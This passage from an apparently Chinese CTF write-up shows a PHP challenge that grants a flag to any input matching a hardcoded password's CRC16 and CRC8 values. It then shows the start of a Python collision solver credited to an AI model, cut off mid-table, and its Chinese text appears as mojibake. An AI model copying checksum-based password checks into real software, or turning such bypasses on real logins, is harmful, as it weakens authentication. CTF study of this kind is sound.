</span></span><span class="line"><span class="cl">        <span class="mh">0x90</span><span class="p">,</span> <span class="mh">0x97</span><span class="p">,</span> <span class="mh">0x9E</span><span class="p">,</span> <span class="mh">0x99</span><span class="p">,</span> <span class="mh">0x8C</span><span class="p">,</span> <span class="mh">0x8B</span><span class="p">,</span> <span class="mh">0x82</span><span class="p">,</span> <span class="mh">0x85</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="mh">0xA8</span><span class="p">,</span> <span class="mh">0xAF</span><span class="p">,</span> <span class="mh">0xA6</span><span class="p">,</span> <span class="mh">0xA1</span><span class="p">,</span> <span class="mh">0xB4</span><span class="p">,</span> <span class="mh">0xB3</span><span class="p">,</span> <span class="mh">0xBA</span><span class="p">,</span> <span class="mh">0xBD</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="mh">0xC7</span><span class="p">,</span> <span class="mh">0xC0</span><span class="p">,</span> <span class="mh">0xC9</span><span class="p">,</span> <span class="mh">0xCE</span><span class="p">,</span> <span class="mh">0xDB</span><span class="p">,</span> <span class="mh">0xDC</span><span class="p">,</span> <span class="mh">0xD5</span><span class="p">,</span> <span class="mh">0xD2</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="mh">0xFF</span><span class="p">,</span> <span class="mh">0xF8</span><span class="p">,</span> <span class="mh">0xF1</span><span class="p">,</span> <span class="mh">0xF6</span><span class="p">,</span> <span class="mh">0xE3</span><span class="p">,</span> <span class="mh">0xE4</span><span class="p">,</span> <span class="mh">0xED</span><span class="p">,</span> <span class="mh">0xEA</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="mh">0xB7</span><span class="p">,</span> <span class="mh">0xB0</span><span class="p">,</span> <span class="mh">0xB9</span><span class="p">,</span> <span class="mh">0xBE</span><span class="p">,</span> <span class="mh">0xAB</span><span class="p">,</span> <span class="mh">0xAC</span><span class="p">,</span> <span class="mh">0xA5</span><span class="p">,</span> <span class="mh">0xA2</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="mh">0x8F</span><span class="p">,</span> <span class="mh">0x88</span><span class="p">,</span> <span class="mh">0x81</span><span class="p">,</span> <span class="mh">0x86</span><span class="p">,</span> <span class="mh">0x93</span><span class="p">,</span> <span class="mh">0x94</span><span class="p">,</span> <span class="mh">0x9D</span><span class="p">,</span> <span class="mh">0x9A</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="mh">0x27</span><span class="p">,</span> <span class="mh">0x20</span><span class="p">,</span> <span class="mh">0x29</span><span class="p">,</span> <span class="mh">0x2E</span><span class="p">,</span> <span class="mh">0x3B</span><span class="p">,</span> <span class="mh">0x3C</span><span class="p">,</span> <span class="mh">0x35</span><span class="p">,</span> <span class="mh">0x32</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="mh">0x1F</span><span class="p">,</span> <span class="mh">0x18</span><span class="p">,</span> <span class="mh">0x11</span><span class="p">,</span> <span class="mh">0x16</span><span class="p">,</span> <span class="mh">0x03</span><span class="p">,</span> <span class="mh">0x04</span><span class="p">,</span> <span class="mh">0x0D</span><span class="p">,</span> <span class="mh">0x0A</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="mh">0x57</span><span class="p">,</span> <span class="mh">0x50</span><span class="p">,</span> <span class="mh">0x59</span><span class="p">,</span> <span class="mh">0x5E</span><span class="p">,</span> <span class="mh">0x4B</span><span class="p">,</span> <span class="mh">0x4C</span><span class="p">,</span> <span class="mh">0x45</span><span class="p">,</span> <span class="mh">0x42</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="mh">0x6F</span><span class="p">,</span> <span class="mh">0x68</span><span class="p">,</span> <span class="mh">0x61</span><span class="p">,</span> <span class="mh">0x66</span><span class="p">,</span> <span class="mh">0x73</span><span class="p">,</span> <span class="mh">0x74</span><span class="p">,</span> <span class="mh">0x7D</span><span class="p">,</span> <span class="mh">0x7A</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="mh">0x89</span><span class="p">,</span> <span class="mh">0x8E</span><span class="p">,</span> <span class="mh">0x87</span><span class="p">,</span> <span class="mh">0x80</span><span class="p">,</span> <span class="mh">0x95</span><span class="p">,</span> <span class="mh">0x92</span><span class="p">,</span> <span class="mh">0x9B</span><span class="p">,</span> <span class="mh">0x9C</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="mh">0xB1</span><span class="p">,</span> <span class="mh">0xB6</span><span class="p">,</span> <span class="mh">0xBF</span><span class="p">,</span> <span class="mh">0xB8</span><span class="p">,</span> <span class="mh">0xAD</span><span class="p">,</span> <span class="mh">0xAA</span><span class="p">,</span> <span class="mh">0xA3</span><span class="p">,</span> <span class="mh">0xA4</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="mh">0xF9</span><span class="p">,</span> <span class="mh">0xFE</span><span class="p">,</span> <span class="mh">0xF7</span><span class="p">,</span> <span class="mh">0xF0</span><span class="p">,</span> <span class="mh">0xE5</span><span class="p">,</span> <span class="mh">0xE2</span><span class="p">,</span> <span class="mh">0xEB</span><span class="p">,</span> <span class="mh">0xEC</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="mh">0xC1</span><span class="p">,</span> <span class="mh">0xC6</span><span class="p">,</span> <span class="mh">0xCF</span><span class="p">,</span> <span class="mh">0xC8</span><span class="p">,</span> <span class="mh">0xDD</span><span class="p">,</span> <span class="mh">0xDA</span><span class="p">,</span> <span class="mh">0xD3</span><span class="p">,</span> <span class="mh">0xD4</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="mh">0x69</span><span class="p">,</span> <span class="mh">0x6E</span><span class="p">,</span> <span class="mh">0x67</span><span class="p">,</span> <span class="mh">0x60</span><span class="p">,</span> <span class="mh">0x75</span><span class="p">,</span> <span class="mh">0x72</span><span class="p">,</span> <span class="mh">0x7B</span><span class="p">,</span> <span class="mh">0x7C</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="mh">0x51</span><span class="p">,</span> <span class="mh">0x56</span><span class="p">,</span> <span class="mh">0x5F</span><span class="p">,</span> <span class="mh">0x58</span><span class="p">,</span> <span class="mh">0x4D</span><span class="p">,</span> <span class="mh">0x4A</span><span class="p">,</span> <span class="mh">0x43</span><span class="p">,</span> <span class="mh">0x44</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="mh">0x19</span><span class="p">,</span> <span class="mh">0x1E</span><span class="p">,</span> <span class="mh">0x17</span><span class="p">,</span> <span class="mh">0x10</span><span class="p">,</span> <span class="mh">0x05</span><span class="p">,</span> <span class="mh">0x02</span><span class="p">,</span> <span class="mh">0x0B</span><span class="p">,</span> <span class="mh">0x0C</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="mh">0x21</span><span class="p">,</span> <span class="mh">0x26</span><span class="p">,</span> <span class="mh">0x2F</span><span class="p">,</span> <span class="mh">0x28</span><span class="p">,</span> <span class="mh">0x3D</span><span class="p">,</span> <span class="mh">0x3A</span><span class="p">,</span> <span class="mh">0x33</span><span class="p">,</span> <span class="mh">0x34</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="mh">0x4E</span><span class="p">,</span> <span class="mh">0x49</span><span class="p">,</span> <span class="mh">0x40</span><span class="p">,</span> <span class="mh">0x47</span><span class="p">,</span> <span class="mh">0x52</span><span class="p">,</span> <span class="mh">0x55</span><span class="p">,</span> <span class="mh">0x5C</span><span class="p">,</span> <span class="mh">0x5B</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="mh">0x76</span><span class="p">,</span> <span class="mh">0x71</span><span class="p">,</span> <span class="mh">0x78</span><span class="p">,</span> <span class="mh">0x7F</span><span class="p">,</span> <span class="mh">0x6A</span><span class="p">,</span> <span class="mh">0x6D</span><span class="p">,</span> <span class="mh">0x64</span><span class="p">,</span> <span class="mh">0x63</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="mh">0x3E</span><span class="p">,</span> <span class="mh">0x39</span><span class="p">,</span> <span class="mh">0x30</span><span class="p">,</span> <span class="mh">0x37</span><span class="p">,</span> <span class="mh">0x22</span><span class="p">,</span> <span class="mh">0x25</span><span class="p">,</span> <span class="mh">0x2C</span><span class="p">,</span> <span class="mh">0x2B</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="mh">0x06</span><span class="p">,</span> <span class="mh">0x01</span><span class="p">,</span> <span class="mh">0x08</span><span class="p">,</span> <span class="mh">0x0F</span><span class="p">,</span> <span class="mh">0x1A</span><span class="p">,</span> <span class="mh">0x1D</span><span class="p">,</span> <span class="mh">0x14</span><span class="p">,</span> <span class="mh">0x13</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="mh">0xAE</span><span class="p">,</span> <span class="mh">0xA9</span><span class="p">,</span> <span class="mh">0xA0</span><span class="p">,</span> <span class="mh">0xA7</span><span class="p">,</span> <span class="mh">0xB2</span><span class="p">,</span> <span class="mh">0xB5</span><span class="p">,</span> <span class="mh">0xBC</span><span class="p">,</span> <span class="mh">0xBB</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="mh">0x96</span><span class="p">,</span> <span class="mh">0x91</span><span class="p">,</span> <span class="mh">0x98</span><span class="p">,</span> <span class="mh">0x9F</span><span class="p">,</span> <span class="mh">0x8A</span><span class="p">,</span> <span class="mh">0x8D</span><span class="p">,</span> <span class="mh">0x84</span><span class="p">,</span> <span class="mh">0x83</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="mh">0xDE</span><span class="p">,</span> <span class="mh">0xD9</span><span class="p">,</span> <span class="mh">0xD0</span><span class="p">,</span> <span class="mh">0xD7</span><span class="p">,</span> <span class="mh">0xC2</span><span class="p">,</span> <span class="mh">0xC5</span><span class="p">,</span> <span class="mh">0xCC</span><span class="p">,</span> <span class="mh">0xCB</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="mh">0xE6</span><span class="p">,</span> <span class="mh">0xE1</span><span class="p">,</span> <span class="mh">0xE8</span><span class="p">,</span> <span class="mh">0xEF</span><span class="p">,</span> <span class="mh">0xFA</span><span class="p">,</span> <span class="mh">0xFD</span><span class="p">,</span> <span class="mh">0xF4</span><span class="p">,</span> <span class="mh">0xF3</span>
</span></span><span class="line"><span class="cl">    <span class="p">];</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="nv">$bytes</span> <span class="o">=</span> <span class="nx">unpack</span><span class="p">(</span><span class="s1">&#39;C*&#39;</span><span class="p">,</span> <span class="nv">$input</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$length</span> <span class="o">=</span> <span class="nx">count</span><span class="p">(</span><span class="nv">$bytes</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$crc</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="p">(</span><span class="nv">$k</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span> <span class="nv">$k</span> <span class="o">&lt;=</span> <span class="nv">$length</span><span class="p">;</span> <span class="nv">$k</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$crc</span> <span class="o">=</span> <span class="nv">$crc8_table</span><span class="p">[(</span><span class="nv">$crc</span> <span class="o">^</span> <span class="nv">$bytes</span><span class="p">[</span><span class="nv">$k</span><span class="p">])</span> <span class="o">&amp;</span> <span class="mh">0xff</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nv">$crc</span> <span class="o">&amp;</span> <span class="mh">0xff</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nv">$SECRET_PASS</span> <span class="o">=</span> <span class="s2">&#34;Enj0yNSSCTF4th!&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="k">include</span> <span class="s2">&#34;flag.php&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;pass&#39;</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="nx">strlen</span><span class="p">(</span><span class="nv">$SECRET_PASS</span><span class="p">)</span> <span class="o">==</span> <span class="nx">strlen</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;pass&#39;</span><span class="p">]))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$correct_pass_crc16</span> <span class="o">=</span> <span class="nx">compute_crc16</span><span class="p">(</span><span class="nv">$SECRET_PASS</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$correct_pass_crc8</span> <span class="o">=</span> <span class="nx">calculate_crc8</span><span class="p">(</span><span class="nv">$SECRET_PASS</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="nv">$user_input</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;pass&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$user_pass_crc16</span> <span class="o">=</span> <span class="nx">compute_crc16</span><span class="p">(</span><span class="nv">$user_input</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$user_pass_crc8</span> <span class="o">=</span> <span class="nx">calculate_crc8</span><span class="p">(</span><span class="nv">$user_input</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="nv">$SECRET_PASS</span> <span class="o">===</span> <span class="nv">$user_input</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">die</span><span class="p">(</span><span class="s2">&#34;è¿™æ ·ä¸è¡Œ&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="nv">$correct_pass_crc16</span> <span class="o">!==</span> <span class="nv">$user_pass_crc16</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">die</span><span class="p">(</span><span class="s2">&#34;è¿™æ ·ä¹Ÿä¸è¡Œ&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="nv">$correct_pass_crc8</span> <span class="o">!==</span> <span class="nv">$user_pass_crc8</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">die</span><span class="p">(</span><span class="s2">&#34;è¿™æ ·è¿˜æ˜¯ä¸è¡Œå§&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="nv">$granted_access</span> <span class="o">=</span> <span class="k">true</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="nv">$granted_access</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">echo</span> <span class="s2">&#34;éƒ½åˆ°è¿™ä»½ä¸Šäº†,flagå°±ç»™ä½ äº†: </span><span class="si">$FLAG</span><span class="s2">&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">echo</span> <span class="s2">&#34;ä¸ä¸ä¸&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">echo</span> <span class="s2">&#34;å†è¯•è¯•&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err"> å†è¯•è¯•
</span></span></span></code></pre></td></tr></table>
</div>
</div><p><a class="link" href="https://chat01.ai/zh/chat/01K58GC1749ZCHE98P3484FJKR"  target="_blank" rel="noopener"
    >https://chat01.ai/zh/chat/01K58GC1749ZCHE98P3484FJKR</a>ï¼Œåˆå‘ç°ä¸€ä¸ªæ–°aiï¼Œèˆ’æœç›´æ¥æ¢­å“ˆ</p>
<img src="image-20250916134448515.png" alt="image-20250916134448515" style="zoom:50%;" />
<p>å°†ä»£ç æ€»ç»“ä¸€ä¸‹å°±æ˜¯è¿™æ ·</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">  1
</span><span class="lnt">  2
</span><span class="lnt">  3
</span><span class="lnt">  4
</span><span class="lnt">  5
</span><span class="lnt">  6
</span><span class="lnt">  7
</span><span class="lnt">  8
</span><span class="lnt">  9
</span><span class="lnt"> 10
</span><span class="lnt"> 11
</span><span class="lnt"> 12
</span><span class="lnt"> 13
</span><span class="lnt"> 14
</span><span class="lnt"> 15
</span><span class="lnt"> 16
</span><span class="lnt"> 17
</span><span class="lnt"> 18
</span><span class="lnt"> 19
</span><span class="lnt"> 20
</span><span class="lnt"> 21
</span><span class="lnt"> 22
</span><span class="lnt"> 23
</span><span class="lnt"> 24
</span><span class="lnt"> 25
</span><span class="lnt"> 26
</span><span class="lnt"> 27
</span><span class="lnt"> 28
</span><span class="lnt"> 29
</span><span class="lnt"> 30
</span><span class="lnt"> 31
</span><span class="lnt"> 32
</span><span class="lnt"> 33
</span><span class="lnt"> 34
</span><span class="lnt"> 35
</span><span class="lnt"> 36
</span><span class="lnt"> 37
</span><span class="lnt"> 38
</span><span class="lnt"> 39
</span><span class="lnt"> 40
</span><span class="lnt"> 41
</span><span class="lnt"> 42
</span><span class="lnt"> 43
</span><span class="lnt"> 44
</span><span class="lnt"> 45
</span><span class="lnt"> 46
</span><span class="lnt"> 47
</span><span class="lnt"> 48
</span><span class="lnt"> 49
</span><span class="lnt"> 50
</span><span class="lnt"> 51
</span><span class="lnt"> 52
</span><span class="lnt"> 53
</span><span class="lnt"> 54
</span><span class="lnt"> 55
</span><span class="lnt"> 56
</span><span class="lnt"> 57
</span><span class="lnt"> 58
</span><span class="lnt"> 59
</span><span class="lnt"> 60
</span><span class="lnt"> 61
</span><span class="lnt"> 62
</span><span class="lnt"> 63
</span><span class="lnt"> 64
</span><span class="lnt"> 65
</span><span class="lnt"> 66
</span><span class="lnt"> 67
</span><span class="lnt"> 68
</span><span class="lnt"> 69
</span><span class="lnt"> 70
</span><span class="lnt"> 71
</span><span class="lnt"> 72
</span><span class="lnt"> 73
</span><span class="lnt"> 74
</span><span class="lnt"> 75
</span><span class="lnt"> 76
</span><span class="lnt"> 77
</span><span class="lnt"> 78
</span><span class="lnt"> 79
</span><span class="lnt"> 80
</span><span class="lnt"> 81
</span><span class="lnt"> 82
</span><span class="lnt"> 83
</span><span class="lnt"> 84
</span><span class="lnt"> 85
</span><span class="lnt"> 86
</span><span class="lnt"> 87
</span><span class="lnt"> 88
</span><span class="lnt"> 89
</span><span class="lnt"> 90
</span><span class="lnt"> 91
</span><span class="lnt"> 92
</span><span class="lnt"> 93
</span><span class="lnt"> 94
</span><span class="lnt"> 95
</span><span class="lnt"> 96
</span><span class="lnt"> 97
</span><span class="lnt"> 98
</span><span class="lnt"> 99
</span><span class="lnt">100
</span><span class="lnt">101
</span><span class="lnt">102
</span><span class="lnt">103
</span><span class="lnt">104
</span><span class="lnt">105
</span><span class="lnt">106
</span><span class="lnt">107
</span><span class="lnt">108
</span><span class="lnt">109
</span><span class="lnt">110
</span><span class="lnt">111
</span><span class="lnt">112
</span><span class="lnt">113
</span><span class="lnt">114
</span><span class="lnt">115
</span><span class="lnt">116
</span><span class="lnt">117
</span><span class="lnt">118
</span><span class="lnt">119
</span><span class="lnt">120
</span><span class="lnt">121
</span><span class="lnt">122
</span><span class="lnt">123
</span><span class="lnt">124
</span><span class="lnt">125
</span><span class="lnt">126
</span><span class="lnt">127
</span><span class="lnt">128
</span><span class="lnt">129
</span><span class="lnt">130
</span><span class="lnt">131
</span><span class="lnt">132
</span><span class="lnt">133
</span><span class="lnt">134
</span><span class="lnt">135
</span><span class="lnt">136
</span><span class="lnt">137
</span><span class="lnt">138
</span><span class="lnt">139
</span><span class="lnt">140
</span><span class="lnt">141
</span><span class="lnt">142
</span><span class="lnt">143
</span><span class="lnt">144
</span><span class="lnt">145
</span><span class="lnt">146
</span><span class="lnt">147
</span><span class="lnt">148
</span><span class="lnt">149
</span><span class="lnt">150
</span><span class="lnt">151
</span><span class="lnt">152
</span><span class="lnt">153
</span><span class="lnt">154
</span><span class="lnt">155
</span><span class="lnt">156
</span><span class="lnt">157
</span><span class="lnt">158
</span><span class="lnt">159
</span><span class="lnt">160
</span><span class="lnt">161
</span><span class="lnt">162
</span><span class="lnt">163
</span><span class="lnt">164
</span><span class="lnt">165
</span><span class="lnt">166
</span><span class="lnt">167
</span><span class="lnt">168
</span><span class="lnt">169
</span><span class="lnt">170
</span><span class="lnt">171
</span><span class="lnt">172
</span><span class="lnt">173
</span><span class="lnt">174
</span><span class="lnt">175
</span><span class="lnt">176
</span><span class="lnt">177
</span><span class="lnt">178
</span><span class="lnt">179
</span><span class="lnt">180
</span><span class="lnt">181
</span><span class="lnt">182
</span><span class="lnt">183
</span><span class="lnt">184
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="c1"># ctf_crc_collision_solver.py</span>
</span></span><span class="line"><span class="cl"><span class="c1"># Author: æ— é—®ç¤¾åŒºAI miniæ¨¡å‹ | ç½‘ç»œå®‰å…¨ä¸“å®¶</span>
</span></span><span class="line"><span class="cl"><span class="c1"># åŠŸèƒ½ï¼šæ±‚è§£åŸºäº CRC16 + CRC8 åŒé‡æ ¡éªŒç»•è¿‡çš„ CTF é¢˜ç›®</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">requests</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># ==================== CRC8 æŸ¥è¡¨æ•°ç»„ï¼ˆæ¥è‡ªPHPæºç ï¼‰====================</span>
</span></span><span class="line"><span class="cl"><span class="n">crc8_table</span> <span class="o">=</span> <span class="p">[</span>
</span></span><span class="line"><span class="cl">    <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x07</span><span class="p">,</span> <span class="mh">0x0E</span><span class="p">,</span> <span class="mh">0x09</span><span class="p">,</span> <span class="mh">0x1C</span><span class="p">,</span> <span class="mh">0x1B</span><span class="p">,</span> <span class="mh">0x12</span><span class="p">,</span> <span class="mh">0x15</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="mh">0x38</span><span class="p">,</span> <span class="mh">0x3F</span><span class="p">,</span> <span class="mh">0x36</span><span class="p">,</span> <span class="mh">0x31</span><span class="p">,</span> <span class="mh">0x24</span><span class="p">,</span> <span class="mh">0x23</span><span class="p">,</span> <span class="mh">0x2A</span><span class="p">,</span> <span class="mh">0x2D</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="mh">0x70</span><span class="p">,</span> <span class="mh">0x77</span><span class="p">,</span> <span class="mh">0x7E</span><span class="p">,</span> <span class="mh">0x79</span><span class="p">,</span> <span class="mh">0x6C</span><span class="p">,</span> <span class="mh">0x6B</span><span class="p">,</span> <span class="mh">0x62</span><span class="p">,</span> <span class="mh">0x65</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="mh">0x48</span><span class="p">,</span> <span class="mh">0x4F</span><span class="p">,</span> <span class="mh">0x46</span><span class="p">,</span> <span class="mh">0x41</span><span class="p">,</span> <span class="mh">0x54</span><span class="p">,</span> <span class="mh">0x53</span><span class="p">,</span> <span class="mh">0x5A</span><span class="p">,</span> <span class="mh">0x5D</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="mh">0xE0</span><span class="p">,</span> <span class="mh">0xE7</span><span class="p">,</span> <span class="mh">0xEE</span><span class="p">,</span> <span class="mh">0xE9</span><span class="p">,</span> <span class="mh">0xFC</span><span class="p">,</span> <span class="mh">0xFB</span><span class="p">,</span> <span class="mh">0xF2</span><span class="p">,</span> <span class="mh">0xF5</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="mh">0xD8</span><span class="p">,</span> <span class="mh">0xDF</span><span class="p">,</span> <span class="mh">0xD6</span><span class="p">,</span> <span class="mh">0xD1</span><span class="p">,</span> <span class="mh">0xC4</span><span class="p">,</span> <span class="mh">0xC3</span><span class="p">,</span> <span class="mh">0xCA</span><span class="p">,</span> <span class="mh">0xCD</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="mh">0x90</span><span class="p">,</span> <span class="mh">0x97</span><span class="p">,</span> <span class="mh">0x9E</span><span class="p">,</span> <span class="mh">0x99</span><span class="p">,</span> <span class="mh">0x8C</span><span class="p">,</span> <span class="mh">0x8B</span><span class="p">,</span> <span class="mh">0x82</span><span class="p">,</span> <span class="mh">0x85</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="mh">0xA8</span><span class="p">,</span> <span class="mh">0xAF</span><span class="p">,</span> <span class="mh">0xA6</span><span class="p">,</span> <span class="mh">0xA1</span><span class="p">,</span> <span class="mh">0xB4</span><span class="p">,</span> <span class="mh">0xB3</span><span class="p">,</span> <span class="mh">0xBA</span><span class="p">,</span> <span class="mh">0xBD</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="mh">0xC7</span><span class="p">,</span> <span class="mh">0xC0</span><span class="p">,</span> <span class="mh">0xC9</span><span class="p">,</span> <span class="mh">0xCE</span><span class="p">,</span> <span class="mh">0xDB</span><span class="p">,</span> <span class="mh">0xDC</span><span class="p">,</span> <span class="mh">0xD5</span><span class="p">,</span> <span class="mh">0xD2</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="mh">0xFF</span><span class="p">,</span> <span class="mh">0xF8</span><span class="p">,</span> <span class="mh">0xF1</span><span class="p">,</span> <span class="mh">0xF6</span><span class="p">,</span> <span class="mh">0xE3</span><span class="p">,</span> <span class="mh">0xE4</span><span class="p">,</span> <span class="mh">0xED</span><span class="p">,</span> <span class="mh">0xEA</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="mh">0xB7</span><span class="p">,</span> <span class="mh">0xB0</span><span class="p">,</span> <span class="mh">0xB9</span><span class="p">,</span> <span class="mh">0xBE</span><span class="p">,</span> <span class="mh">0xAB</span><span class="p">,</span> <span class="mh">0xAC</span><span class="p">,</span> <span class="mh">0xA5</span><span class="p">,</span> <span class="mh">0xA2</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="mh">0x8F</span><span class="p">,</span> <span class="mh">0x88</span><span class="p">,</span> <span class="mh">0x81</span><span class="p">,</span> <span class="mh">0x86</span><span class="p">,</span> <span class="mh">0x93</span><span class="p">,</span> <span class="mh">0x94</span><span class="p">,</span> <span class="mh">0x9D</span><span class="p">,</span> <span class="mh">0x9A</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="mh">0x27</span><span class="p">,</span> <span class="mh">0x20</span><span class="p">,</span> <span class="mh">0x29</span><span class="p">,</span> <span class="mh">0x2E</span><span class="p">,</span> <span class="mh">0x3B</span><span class="p">,</span> <span class="mh">0x3C</span><span class="p">,</span> <span class="mh">0x35</span><span class="p">,</span> <span class="mh">0x32</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="mh">0x1F</span><span class="p">,</span> <span class="mh">0x18</span><span class="p">,</span> <span class="mh">0x11</span><span class="p">,</span> <span class="mh">0x16</span><span class="p">,</span> <span class="mh">0x03</span><span class="p">,</span> <span class="mh">0x04</span><span class="p">,</span> <span class="mh">0x0D</span><span class="p">,</span> <span class="mh">0x0A</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="mh">0x57</span><span class="p">,</span> <span class="mh">0x50</span><span class="p">,</span> <span class="mh">0x59</span><span class="p">,</span> <span class="mh">0x5E</span><span class="p">,</span> <span class="mh">0x4B</span><span class="p">,</span> <span class="mh">0x4C</span><span class="p">,</span> <span class="mh">0x45</span><span class="p">,</span> <span class="mh">0x42</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="mh">0x6F</span><span class="p">,</span> <span class="mh">0x68</span><span class="p">,</span> <span class="mh">0x61</span><span class="p">,</span> <span class="mh">0x66</span><span class="p">,</span> <span class="mh">0x73</span><span class="p">,</span> <span class="mh">0x74</span><span class="p">,</span> <span class="mh">0x7D</span><span class="p">,</span> <span class="mh">0x7A</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="mh">0x89</span><span class="p">,</span> <span class="mh">0x8E</span><span class="p">,</span> <span class="mh">0x87</span><span class="p">,</span> <span class="mh">0x80</span><span class="p">,</span> <span class="mh">0x95</span><span class="p">,</span> <span class="mh">0x92</span><span class="p">,</span> <span class="mh">0x9B</span><span class="p">,</span> <span class="mh">0x9C</span><span class="p">,</span>
